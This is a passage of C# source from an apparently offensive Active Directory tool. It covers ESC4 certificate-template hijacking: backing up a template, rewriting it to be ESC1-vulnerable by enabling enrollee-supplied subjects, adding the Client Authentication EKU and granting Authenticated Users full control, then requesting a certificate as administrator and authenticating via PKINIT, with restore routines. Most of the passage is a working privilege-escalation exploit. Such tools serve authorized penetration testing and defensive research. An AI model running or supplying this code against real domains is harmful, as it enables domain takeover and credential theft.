                    if (!quiet) Console.WriteLine($"[*] msPKI-Enrollment-Flag: 0x{backup.EnrollmentFlag:X8}");
                }

                // Get pKIExtendedKeyUsage
                if (templateEntry.Properties["pKIExtendedKeyUsage"].Count > 0)
                {
                    foreach (var eku in templateEntry.Properties["pKIExtendedKeyUsage"])
                    {
                        backup.ExtendedKeyUsage.Add(eku.ToString());
                    }
                    if (!quiet) Console.WriteLine($"[*] pKIExtendedKeyUsage: {string.Join(", ", backup.ExtendedKeyUsage)}");
                }

                // Get msPKI-Certificate-Application-Policy
                if (templateEntry.Properties["msPKI-Certificate-Application-Policy"].Count > 0)
                {
                    foreach (var policy in templateEntry.Properties["msPKI-Certificate-Application-Policy"])
                    {
                        backup.CertificateApplicationPolicy.Add(policy.ToString());
                    }
                    if (!quiet) Console.WriteLine($"[*] msPKI-Certificate-Application-Policy: {string.Join(", ", backup.CertificateApplicationPolicy)}");
                }

                // Get msPKI-RA-Signature
                if (templateEntry.Properties["msPKI-RA-Signature"].Value != null)
                {
                    backup.RASignature = Convert.ToInt32(templateEntry.Properties["msPKI-RA-Signature"].Value);
                    if (!quiet) Console.WriteLine($"[*] msPKI-RA-Signature: {backup.RASignature}");
                }

                // Get Security Descriptor using ObjectSecurity
                try
                {
                    ActiveDirectorySecurity adSec = templateEntry.ObjectSecurity;
                    byte[] sdBytes = adSec.GetSecurityDescriptorBinaryForm();
                    backup.SecurityDescriptorBase64 = Convert.ToBase64String(sdBytes);
                    if (!quiet) Console.WriteLine($"[*] Security Descriptor: {sdBytes.Length} bytes");
                }
                catch (Exception sdEx)
                {
                    OutputHelper.Verbose($"[!] Could not backup security descriptor: {sdEx.Message}");
                }

                // Save to JSON file
                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                string backupFile = $"{templateName}_backup_{timestamp}.json";
                string json = backup.ToJson();
                File.WriteAllText(backupFile, json);

                if (!quiet)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"\n[+] Backup saved to: {Path.GetFullPath(backupFile)}");
                    Console.ResetColor();
                }

                return backupFile;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error backing up template: {ex.Message}");
                OutputHelper.Verbose($"[!] Stack trace: {ex.StackTrace}");
                return null;
            }
        }

        
        /// Modify template to be ESC1 vulnerable:
        /// - Enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
        /// - Add Domain Users enrollment permission
        /// - Ensure Client Authentication EKU exists
        public static bool ModifyTemplateToESC1(string templateName, bool createBackup = true, bool quiet = false)
        {
            if (!quiet) Console.WriteLine($"\n[*] ESC4 -> ESC1 Template Modification: {templateName}\n");

            try
            {
                // Create backup first if requested
                string backupFile = null;
                if (createBackup)
                {
                    backupFile = BackupTemplateConfiguration(templateName, quiet);
                    if (string.IsNullOrEmpty(backupFile))
                    {
                        Console.WriteLine("[!] Failed to create backup. Aborting modification.");
                        return false;
                    }
                    if (!quiet) Console.WriteLine();
                }

                DirectoryEntry rootDSE = AuthContext.GetRootDSE();
                string configNC = rootDSE.Properties["configurationNamingContext"][0].ToString();

                string templateDN = $"CN={templateName},CN=Certificate Templates,CN=Public Key Services,CN=Services,{configNC}";

                // Step 1: Modify msPKI-Certificate-Name-Flag (separate commit like Certify does)
                OutputHelper.Verbose("[*] Step 1: Setting CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT...");
                try
                {
                    DirectoryEntry templateEntry1 = AuthContext.GetDirectoryEntry($"LDAP://{templateDN}");
                    templateEntry1.RefreshCache(new string[] { "msPKI-Certificate-Name-Flag" });

                    int currentNameFlag = 0;
                    if (templateEntry1.Properties["msPKI-Certificate-Name-Flag"].Value != null)
                    {
                        currentNameFlag = Convert.ToInt32(templateEntry1.Properties["msPKI-Certificate-Name-Flag"].Value);
                    }

                    // Set bit 0 (ENROLLEE_SUPPLIES_SUBJECT)
                    int newNameFlag = currentNameFlag | 1;

                    OutputHelper.Verbose($"    Old: 0x{currentNameFlag:X8} -> New: 0x{newNameFlag:X8}");

                    templateEntry1.Properties["msPKI-Certificate-Name-Flag"].Value = newNameFlag;
                    templateEntry1.CommitChanges();
                    templateEntry1.Close();

                    if (!quiet) Console.WriteLine("[+] CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set");
                }
                catch (Exception ex1)
                {
                    Console.WriteLine($"[!] Failed to set flag: {ex1.Message}");
                    OutputHelper.Verbose($"    Stack trace: {ex1.StackTrace}");
                }

                // Step 2: Add Client Authentication EKU if needed (separate commit)
                OutputHelper.Verbose("[*] Step 2: Checking Client Authentication EKU...");
                try
                {
                    DirectoryEntry templateEntry2 = AuthContext.GetDirectoryEntry($"LDAP://{templateDN}");
                    templateEntry2.RefreshCache(new string[] { "pKIExtendedKeyUsage" });

                    bool hasClientAuth = false;
                    foreach (var eku in templateEntry2.Properties["pKIExtendedKeyUsage"])
                    {
                        if (eku.ToString() == OID_CLIENT_AUTH)
                        {
                            hasClientAuth = true;
                            break;
                        }
                    }

                    if (!hasClientAuth)
                    {
                        OutputHelper.Verbose("    Adding Client Authentication EKU...");
                        templateEntry2.Properties["pKIExtendedKeyUsage"].Add(OID_CLIENT_AUTH);
                        templateEntry2.CommitChanges();
                        if (!quiet) Console.WriteLine("[+] Client Authentication EKU added");
                    }
                    else
                    {
                        OutputHelper.Verbose("    Client Authentication EKU already present.");
                    }
                    templateEntry2.Close();
                }
                catch (Exception ex2)
                {
                    Console.WriteLine($"[!] Failed to modify EKU: {ex2.Message}");
                }

                // Step 3: Add GenericAll (Full Control) for Authenticated Users
                // This grants all permissions including Enroll, Read, Write, etc.
                OutputHelper.Verbose("[*] Step 3: Adding GenericAll permissions...");

                try
                {
                    DirectoryEntry templateEntry3 = AuthContext.GetDirectoryEntry($"LDAP://{templateDN}");

                    // Set SecurityMasks to allow DACL modification
                    templateEntry3.Options.SecurityMasks = SecurityMasks.Dacl;
                    templateEntry3.RefreshCache(new string[] { "nTSecurityDescriptor" });

                    // Get current security descriptor
                    ActiveDirectorySecurity adSec = templateEntry3.ObjectSecurity;

                    // Add GenericAll for Authenticated Users (S-1-5-11)
                    SecurityIdentifier authUsersSI = new SecurityIdentifier("S-1-5-11");
                    ActiveDirectoryAccessRule genericAllRule = new ActiveDirectoryAccessRule(
                        authUsersSI,
                        ActiveDirectoryRights.GenericAll,
                        AccessControlType.Allow,
                        ActiveDirectorySecurityInheritance.None);
                    adSec.AddAccessRule(genericAllRule);

                    // Apply changes using ObjectSecurity
                    templateEntry3.ObjectSecurity = adSec;
                    templateEntry3.CommitChanges();
                    templateEntry3.Close();

                    if (!quiet) Console.WriteLine("[+] GenericAll (Full Control) added for Authenticated Users");
                }
                catch (Exception ex3)
                {
                    if (!quiet) Console.WriteLine($"[!] Adding GenericAll failed: {ex3.Message}");
                    OutputHelper.Verbose($"    {ex3.StackTrace}");

                    // Fallback: try adding just Enroll extended right
                    OutputHelper.Verbose("[*] Trying fallback with Enroll permission only...");
                    try
                    {
                        DirectoryEntry templateEntry3b = AuthContext.GetDirectoryEntry($"LDAP://{templateDN}");
                        templateEntry3b.Options.SecurityMasks = SecurityMasks.Dacl;
                        templateEntry3b.RefreshCache(new string[] { "nTSecurityDescriptor" });

                        ActiveDirectorySecurity adSec = templateEntry3b.ObjectSecurity;

                        // Add Enroll extended right
                        Guid enrollGuid = new Guid(GUID_ENROLL);
                        SecurityIdentifier authUsersSI = new SecurityIdentifier("S-1-5-11");
                        ActiveDirectoryAccessRule enrollRule = new ActiveDirectoryAccessRule(
                            authUsersSI,
                            ActiveDirectoryRights.ExtendedRight,
                            AccessControlType.Allow,
                            enrollGuid,
                            ActiveDirectorySecurityInheritance.None);

                        adSec.AddAccessRule(enrollRule);
                        templateEntry3b.ObjectSecurity = adSec;
                        templateEntry3b.CommitChanges();
                        templateEntry3b.Close();

                        if (!quiet) Console.WriteLine("[+] Enroll permission added (fallback method)");
                    }
                    catch (Exception ex3b)
                    {
                        Console.WriteLine($"[!] Fallback also failed: {ex3b.Message}");
                    }
                }

                // Interactive mode only if not quiet
                if (!quiet)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[+] Template modification completed!");
                    Console.ResetColor();
                    Console.WriteLine("[+] Template should now be vulnerable to ESC1 (if all steps succeeded).");

                    // Ask if user wants to exploit ESC1 now using the modified template
                    Console.Write($"\n[?] Do you want to exploit ESC1 using the modified template '{templateName}'? (y/n): ");
                    string exploitChoice = Console.ReadLine()?.Trim().ToLower();

                    if (exploitChoice == "y" || exploitChoice == "yes")
                    {
                        Console.Write($"[?] Template to use [{templateName}]: ");
                        string templateToUse = Console.ReadLine()?.Trim();
                        if (string.IsNullOrEmpty(templateToUse))
                            templateToUse = templateName;

                        Console.Write("[?] Target user (default: administrator): ");
                        string targetUser = Console.ReadLine()?.Trim();
                        if (string.IsNullOrEmpty(targetUser))
                            targetUser = "administrator";

                        Console.WriteLine($"\n[*] Requesting certificate for {targetUser} using template '{templateToUse}'...\n");
                        string pfxPath = RequestCertificateAuto(targetUser, null, templateToUse, true);

                        // Ask if user wants to authenticate via PKINIT
                        if (!string.IsNullOrEmpty(pfxPath))
                        {
                            Console.Write("\n[?] Do you want to authenticate via PKINIT now? (y/n): ");
                            string pkinitChoice = Console.ReadLine()?.Trim().ToLower();

                            if (pkinitChoice == "y" || pkinitChoice == "yes")
                            {
                                Console.WriteLine($"\n[*] Authenticating as {targetUser} using PKINIT...\n");
                                PkinitAuth.AskTgt(pfxPath, "", null, targetUser, true);
                            }
                        }

                    }
                    else
                    {
                        Console.WriteLine($"\n[*] Next steps:");
                        Console.WriteLine($"    1. Request certificate: SpicyAD.exe request-cert auto administrator --sid");
                        Console.WriteLine($"    2. Get TGT: SpicyAD.exe asktgt /certificate:<pfx> /getcredentials");
                        if (!string.IsNullOrEmpty(backupFile))
                        {
                            Console.WriteLine($"    3. Restore template: SpicyAD.exe esc4 restore {backupFile}");
                        }
                    }
                }

                // Ask if user wants to restore the template (interactive mode only)
                if (!quiet && !string.IsNullOrEmpty(backupFile))
                {
                    Console.Write($"\n[?] Do you want to restore the template now? [default: {backupFile}] (y/n): ");
                    string restoreChoice = Console.ReadLine()?.Trim().ToLower();

                    if (restoreChoice == "y" || restoreChoice == "yes")
                    {
                        Console.Write($"[?] Backup file path [{backupFile}]: ");
                        string restorePath = Console.ReadLine()?.Trim();
                        if (string.IsNullOrEmpty(restorePath))
                            restorePath = backupFile;

                        RestoreTemplateConfiguration(restorePath);
                    }
                }

                return true;
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("[!] Access denied. You don't have write permission on this template.");
                Console.WriteLine("[!] Make sure you have ESC4 write access (GenericWrite, WriteDacl, etc.)");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error modifying template: {ex.Message}");
                OutputHelper.Verbose($"[!] Stack trace: {ex.StackTrace}");
                return false;
            }
        }

        
        /// Restore template configuration from backup file
        public static bool RestoreTemplateConfiguration(string backupFile, bool quiet = false)
        {
            if (!quiet) Console.WriteLine($"\n[*] Restoring template from backup: {backupFile}\n");

            try
            {
                if (!File.Exists(backupFile))
                {
                    Console.WriteLine($"[!] Backup file not found: {backupFile}");
                    return false;
                }

                string json = File.ReadAllText(backupFile);
                TemplateBackup backup = TemplateBackup.FromJson(json);

                if (!quiet)
                {
                    Console.WriteLine($"[*] Template: {backup.TemplateName}");
                    Console.WriteLine($"[*] Backup Time: {backup.BackupTime}");
                    Console.WriteLine($"[*] Template DN: {backup.TemplateDN}");
                    Console.WriteLine("\n[*] Restoring attributes (separate commits)...");
                }

                // Step 1: Restore msPKI-Certificate-Name-Flag
                if (backup.CertificateNameFlag.HasValue)
                {
                    try
                    {
                        DirectoryEntry entry1 = AuthContext.GetDirectoryEntry($"LDAP://{backup.TemplateDN}");
                        entry1.Properties["msPKI-Certificate-Name-Flag"].Value = backup.CertificateNameFlag.Value;
                        entry1.CommitChanges();
                        entry1.Close();
                        if (!quiet) Console.WriteLine($"    [+] msPKI-Certificate-Name-Flag: 0x{backup.CertificateNameFlag:X8}");
                    }
                    catch (Exception ex)
                    {
                        if (!quiet) Console.WriteLine($"    [!] msPKI-Certificate-Name-Flag failed: {ex.Message}");
                    }
                }

                // Step 2: Restore msPKI-Enrollment-Flag
                if (backup.EnrollmentFlag.HasValue)
                {
                    try
                    {
                        DirectoryEntry entry2 = AuthContext.GetDirectoryEntry($"LDAP://{backup.TemplateDN}");
                        entry2.Properties["msPKI-Enrollment-Flag"].Value = backup.EnrollmentFlag.Value;
                        entry2.CommitChanges();
                        entry2.Close();
                        if (!quiet) Console.WriteLine($"    [+] msPKI-Enrollment-Flag: 0x{backup.EnrollmentFlag:X8}");
                    }
                    catch (Exception ex)
                    {
                        if (!quiet) Console.WriteLine($"    [!] msPKI-Enrollment-Flag failed: {ex.Message}");
                    }
                }

                // Step 3: Restore pKIExtendedKeyUsage
                if (backup.ExtendedKeyUsage != null && backup.ExtendedKeyUsage.Count > 0)
                {
                    try
                    {
                        DirectoryEntry entry3 = AuthContext.GetDirectoryEntry($"LDAP://{backup.TemplateDN}");
                        entry3.Properties["pKIExtendedKeyUsage"].Clear();
                        foreach (var eku in backup.ExtendedKeyUsage)
                        {
                            entry3.Properties["pKIExtendedKeyUsage"].Add(eku);
                        }
                        entry3.CommitChanges();
                        entry3.Close();
                        if (!quiet) Console.WriteLine($"    [+] pKIExtendedKeyUsage: {string.Join(", ", backup.ExtendedKeyUsage)}");
                    }
                    catch (Exception ex)
                    {
                        if (!quiet) Console.WriteLine($"    [!] pKIExtendedKeyUsage failed: {ex.Message}");
                    }
                }

                // Step 4: Restore msPKI-Certificate-Application-Policy
                if (backup.CertificateApplicationPolicy != null && backup.CertificateApplicationPolicy.Count > 0)
                {
                    try
                    {
                        DirectoryEntry entry4 = AuthContext.GetDirectoryEntry($"LDAP://{backup.TemplateDN}");
                        entry4.Properties["msPKI-Certificate-Application-Policy"].Clear();
                        foreach (var policy in backup.CertificateApplicationPolicy)
                        {
                            entry4.Properties["msPKI-Certificate-Application-Policy"].Add(policy);
                        }
                        entry4.CommitChanges();
                        entry4.Close();
                        if (!quiet) Console.WriteLine($"    [+] msPKI-Certificate-Application-Policy restored");
                    }
                    catch (Exception ex)
                    {
                        if (!quiet) Console.WriteLine($"    [!] msPKI-Certificate-Application-Policy failed: {ex.Message}");
                    }
                }

                // Step 5: Restore msPKI-RA-Signature
                if (backup.RASignature.HasValue)
                {
                    try
                    {
                        DirectoryEntry entry5 = AuthContext.GetDirectoryEntry($"LDAP://{backup.TemplateDN}");
                        entry5.Properties["msPKI-RA-Signature"].Value = backup.RASignature.Value;
                        entry5.CommitChanges();
                        entry5.Close();
                        if (!quiet) Console.WriteLine($"    [+] msPKI-RA-Signature: {backup.RASignature}");
                    }
                    catch (Exception ex)
                    {
                        if (!quiet) Console.WriteLine($"    [!] msPKI-RA-Signature failed: {ex.Message}");
                    }
                }

                // Step 6: Restore Security Descriptor (ACLs) - Critical for ESC4 cleanup
                if (!string.IsNullOrEmpty(backup.SecurityDescriptorBase64))
                {
                    if (!quiet) Console.WriteLine("[*] Restoring security descriptor (ACLs)...");
                    byte[] sdBytes = Convert.FromBase64String(backup.SecurityDescriptorBase64);
                    bool restored = false;

                    // Method 1: Use Options.SecurityMasks with ObjectSecurity (like StandIn)
                    try
                    {
                        DirectoryEntry entry6 = AuthContext.GetDirectoryEntry($"LDAP://{backup.TemplateDN}");
                        entry6.Options.SecurityMasks = SecurityMasks.Dacl | SecurityMasks.Owner;
                        entry6.RefreshCache(new string[] { "nTSecurityDescriptor" });

                        // Parse the backup SD and apply it
                        ActiveDirectorySecurity adSec = new ActiveDirectorySecurity();
                        adSec.SetSecurityDescriptorBinaryForm(sdBytes);
                        entry6.ObjectSecurity = adSec;
                        entry6.CommitChanges();
                        entry6.Close();

                        if (!quiet) Console.WriteLine($"    [+] Security Descriptor restored: {sdBytes.Length} bytes");
                        restored = true;
                    }
                    catch (Exception sdEx1)
                    {
                        OutputHelper.Verbose($"    [*] Method 1 failed: {sdEx1.Message}");
                    }

                    // Method 2: Try using raw nTSecurityDescriptor attribute
                    if (!restored)
                    {
                        try
                        {
                            DirectoryEntry entry6b = AuthContext.GetDirectoryEntry($"LDAP://{backup.TemplateDN}");
                            entry6b.Properties["nTSecurityDescriptor"].Value = sdBytes;
                            entry6b.CommitChanges();
                            entry6b.Close();
                            if (!quiet) Console.WriteLine($"    [+] Security Descriptor restored (method 2): {sdBytes.Length} bytes");
                            restored = true;
                        }
                        catch (Exception sdEx2)
                        {
                            OutputHelper.Verbose($"    [*] Method 2 failed: {sdEx2.Message}");
                        }
                    }

                    // Method 3: Try SetSecurityDescriptorBinaryForm on existing ObjectSecurity
                    if (!restored)
                    {
                        try
                        {
                            DirectoryEntry entry6c = AuthContext.GetDirectoryEntry($"LDAP://{backup.TemplateDN}");
                            entry6c.Options.SecurityMasks = SecurityMasks.Dacl;
                            entry6c.RefreshCache(new string[] { "nTSecurityDescriptor" });

                            entry6c.ObjectSecurity.SetSecurityDescriptorBinaryForm(sdBytes, AccessControlSections.Access);
                            entry6c.CommitChanges();
                            entry6c.Close();
                            if (!quiet) Console.WriteLine($"    [+] Security Descriptor restored (method 3): {sdBytes.Length} bytes");
                            restored = true;
                        }
                        catch (Exception sdEx3)
                        {
                            OutputHelper.Verbose($"    [*] Method 3 failed: {sdEx3.Message}");
                        }
                    }

                    if (!restored && !quiet)
                    {
                        Console.WriteLine($"    [!] Security descriptor restore failed.");
                        Console.WriteLine("        You may need to manually restore ACLs from the backup file.");
                        Console.WriteLine($"        SecurityDescriptor (Base64): {backup.SecurityDescriptorBase64.Substring(0, Math.Min(50, backup.SecurityDescriptorBase64.Length))}...");
                    }
                }

                if (!quiet)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[+] Template restore completed!");
                    Console.ResetColor();
                }

                return true;
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("[!] Access denied. You don't have write permission on this template.");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error restoring template: {ex.Message}");
                OutputHelper.Verbose($"[!] Stack trace: {ex.StackTrace}");
                return false;
            }
        }

        
        /// Command-line ESC4 handler
        public static void HandleESC4Command(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("[*] ESC4 Template Hijacking\n");
                Console.WriteLine("Usage:");
                Console.WriteLine("  SpicyAD.exe esc4 list                          - List ESC4 vulnerable templates");
                Console.WriteLine("  SpicyAD.exe esc4 backup <template>             - Backup template configuration");
                Console.WriteLine("  SpicyAD.exe esc4 modify <template>             - Modify template to ESC1 (creates backup)");
                Console.WriteLine("  SpicyAD.exe esc4 modify <template> --no-backup - Modify without creating backup");
                Console.WriteLine("  SpicyAD.exe esc4 restore <backup.json>         - Restore from backup file");
                return;
            }

            string subCommand = args[1].ToLower();

            switch (subCommand)
            {
                case "list":
                    ListESC4Templates();
                    break;

                case "backup":
                    if (args.Length < 3)
                    {
                        Console.WriteLine("[!] Usage: SpicyAD.exe esc4 backup <template>");
                        return;
                    }
                    BackupTemplateConfiguration(args[2]);
                    break;

                case "modify":
                    if (args.Length < 3)
                    {
                        Console.WriteLine("[!] Usage: SpicyAD.exe esc4 modify <template> [--no-backup]");
                        return;
                    }
                    bool createBackup = !args.Any(a => a.ToLower() == "--no-backup");
                    ModifyTemplateToESC1(args[2], createBackup);
                    break;

                case "restore":
                    if (args.Length < 3)
                    {
                        Console.WriteLine("[!] Usage: SpicyAD.exe esc4 restore <backup.json>");
                        return;
                    }
                    RestoreTemplateConfiguration(args[2]);
                    break;

                default:
                    Console.WriteLine($"[!] Unknown ESC4 subcommand: {subCommand}");
                    HandleESC4Command(new string[] { "esc4" });
                    break;
            }
        }

        #endregion

    }
}
